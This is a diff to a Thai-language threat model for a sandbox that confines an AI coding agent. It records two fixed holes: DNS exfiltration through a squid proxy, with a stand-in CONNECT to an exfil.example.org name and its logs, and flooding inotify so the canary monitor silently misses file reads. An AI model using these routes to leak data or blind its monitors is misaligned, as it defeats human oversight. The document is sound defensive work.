@@ -305,6 +305,24 @@ raw content การ front ไปหา origin ของผู้โจมต�
    egress ที่รู้จัก SNI (SNI proxy / L7 firewall) — เป็น **การตัดสินใจ** เพราะกระทบเส้น
    "ไม่ทำ SSL-bump" ใน §3.1 ไม่ใช่แค่แก้ config
 
+**ปิดแล้ว (session 12): DNS exfiltration ผ่าน proxy.** กฎ `http_access deny private_dst` (ACL ชนิด `dst`
+ที่ต้องรู้ IP ปลายทาง) เคยถูกประเมิน **ก่อน** allowlist squid จึง resolve ทุกชื่อที่ agent ส่งมาใน CONNECT
+แล้วค่อยตอบ 403 — ข้อมูลที่ใส่ไว้ใน label ของชื่อโดเมนจึงไปถึง nameserver ของผู้โจมตีได้ วัดด้วย squid จริง
++ DNS ปลอมที่บันทึกทุก query:
+
+```
+# ก่อนแก้: CONNECT secret-old.exfil.example.org:443
+TCP_DENIED/403 CONNECT secret-old.exfil.example.org:443        # squid access.log
+QUERY secret-old.exfil.example.org type 1 from 172.30.0.10     # nameserver ได้ข้อมูลไปแล้ว
+# หลังแก้: 403 เหมือนเดิม แต่ไม่มี query ของชื่อนี้เลย
+```
+
+ตอนนี้ `deny !allowed_domains` (จับชื่อ ไม่ resolve) มาก่อน `private_dst` ชื่อนอก allowlist จึงไม่ถูก resolve
+เลย ส่วนชื่อใน allowlist ที่ resolve เป็น IP ภายใน (DNS rebinding) ยังถูกปฏิเสธเหมือนเดิม ทดสอบด้วย phase L
+(ค่าที่วัดข้างบนมาจาก squid 6.13 ของ `ubuntu/squid` ใน session คลาวด์ — image จริงใช้ squid 5.7 ของ Debian
+ต้องรัน phase L บน image จริงก่อนออก tag) และ self-test 3b2 วัดว่า resolver ของ Docker (127.0.0.11) ในกรง
+ไม่ตอบชื่อภายนอก (Docker Engine 29.3 บน network `internal`: `SERVFAIL`; บน Docker Desktop ยังไม่ได้วัด)
+
 ### 4.3 โค้ดที่ agent เขียนแล้วเอาไปรันบนโฮสต์
 กรงคุ้มครองแค่ตอน agent รันอยู่ข้างใน `git diff` ก่อน merge เสมอ
 **บรรเทา:** ตั้ง pre-commit hook สแกน secret และ review diff ทุกครั้ง
@@ -354,6 +372,32 @@ bind mount ของ Docker Desktop บน Windows/macOS ไม่ใช่ file
 **สิ่งที่ยังเหลือ:** canary ที่วางใน bind mount ตรง ๆ (3 ใน 7 path) ยังบังคับใช้ไม่ได้
 บน Docker Desktop และ monitor จะรายงานตรง ๆ ว่า `enforced=4/7`
 ทั้ง inline monitor และ sentinel เฝ้า vault ได้ทั้งคู่แล้ว บน Linux จะได้ `7/7`
+
+### 4.6 คิว inotify ล้น = event หาย (ถือเป็น breach)
+
+inotify ของแต่ละ monitor มีคิวจำกัด (`/proc/sys/fs/inotify/max_queued_events`, ค่าปกติ 16384)
+เมื่อคิวเต็ม kernel **ทิ้ง event ที่ตามมาทั้งหมด** แล้วใส่ `IN_Q_OVERFLOW` ไว้หนึ่งอัน
+agent เขียนไดเรกทอรีที่ถูกเฝ้าได้ (vault และบน Linux คือ root ของ `/workspace`) จึงสร้าง event จำนวนมากได้
+
+ก่อน session 12 monitor ข้าม `IN_Q_OVERFLOW` ไปเงียบ ๆ: วัดแล้ว — หยุด monitor ชั่วคราว, สร้างไฟล์
+24000 event ใน vault, อ่าน canary แล้วปล่อย monitor → **ไม่มี breach, monitor ยังบอกว่า armed**
+ตอนนี้ monitor ถือว่าคิวล้นเป็น breach (fail closed) และบอกตรง ๆ ว่ารู้แค่ว่า event หาย:
+
+```
+*** [SECURITY BREACH] events lost: inotify queue overflowed mode=sentinel
+*** [SECURITY BREACH] Canary events were lost - a canary access cannot be ruled out!
+```
+
+CLI แสดงผลจาก log ของ sentinel ว่า `its inotify queue overflowed, so events were lost and a canary access
+cannot be ruled out` (ไม่ใช่ "sentinel recorded no breach") ทดสอบด้วย drill E9
+
+**ที่วัดได้จริง:** บนเครื่อง Linux 4 คอร์ (cloud container, overlayfs, session 12) (และเมื่อจำกัดให้ monitor กับผู้โจมตีใช้ 2 คอร์ร่วมกัน) flooder ภาษา C
+2–8 ตัวที่ `--cpus 2` **ไม่ทำให้คิวของ monitor ที่ไม่ถูกหยุดล้น** และ flood 5 วินาทีโดยไม่อ่าน canary ไม่ทำให้
+monitor ใหม่ trip ผิด ๆ agent หยุด inline monitor ได้ (uid เดียวกัน — แต่ก็ฆ่ามันได้อยู่แล้ว) ส่วน sentinel
+ถูกหยุดจาก agent ไม่ได้ บนเครื่องที่ CPU น้อยกว่า (VM ของ Docker Desktop) ยังไม่ได้วัด
+งานที่ไม่ได้มีเจตนาร้ายแทบไม่มีทางสร้าง 16384 event ในไดเรกทอรีเหล่านี้เร็วกว่าที่ monitor อ่านทัน
+แต่ถ้าเกิดขึ้น session จะจบด้วย exit 99 — เราเลือกแบบนี้เพราะ tripwire ที่บอกว่า armed ขณะที่ event หายไป
+แย่กว่าการหยุด session ผิดจังหวะ
 
 ---
 
